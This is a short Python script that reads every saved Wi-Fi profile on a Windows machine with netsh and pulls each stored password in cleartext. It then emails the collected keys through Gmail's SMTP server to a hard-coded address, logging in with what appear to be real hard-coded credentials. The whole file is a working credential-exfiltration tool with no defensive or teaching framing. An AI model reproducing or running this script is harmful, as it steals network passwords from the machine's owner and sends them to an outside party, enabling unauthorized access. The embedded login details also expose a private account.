import subprocess,smtplib,re
email_default="yourgmail@gmail.com"
password_default="Your password"

#Start the send_mail function

def send_mail(email,password,message):
    server=smtplib.SMTP("smtp.gmail.com",587)                      #connection to the smtp gmail server using the port 587
    server.starttls()                                              #start the connection
    server.login(email,password)                                   #Loging the system
    server.sendmail(email,email,message)
    server.quit()


shellcommand="netsh wlan show profile"
network=subprocess.check_output(shellcommand, shell=True)
network=network.decode('utf-8')                                     # used to encode the byte to string
unique_pattern="(?:Profile\s*:\s)(.*)"                                               
network_names_list=re.findall(unique_pattern,network)
final_result=""

#loop for capturing the name of the ssid


for network_name in network_names_list:
    command='netsh wlan show profile '+'"'+network_name + '"' + ' key=clear'
    current_result=subprocess.check_output(command, shell="True")
    current_result = current_result.decode()                              # used to decode the byte to string
    final_result=final_result+str(current_result)

#Calling of the mail function

send_mail("jenniferjeanne123@gmail.com","saurav12345","\n\n" +str(final_result))

